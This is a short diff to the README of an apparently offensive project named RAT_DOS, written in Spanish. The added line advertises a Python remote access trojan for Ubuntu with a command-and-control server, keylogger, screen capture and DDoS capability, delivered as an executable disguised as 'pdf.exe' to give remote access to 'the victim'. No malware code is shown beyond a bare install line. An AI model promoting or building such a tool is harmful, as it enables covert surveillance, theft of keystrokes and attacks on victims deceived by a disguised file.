@@ -1,6 +1,6 @@
 # RAT_DOS
 Rat con C2
-Este es un RAT para ubunto con keyloger y captutra de panatalla hecho en 100% python 
+Este es un RAT para ubunto con keyloger, captutra de panatalla y ataque de ddos entra como un ejecutable en un pdf.exe y ya tienes acceso remoto a la victima en 100% python 
 
 ```sh
 install apt python
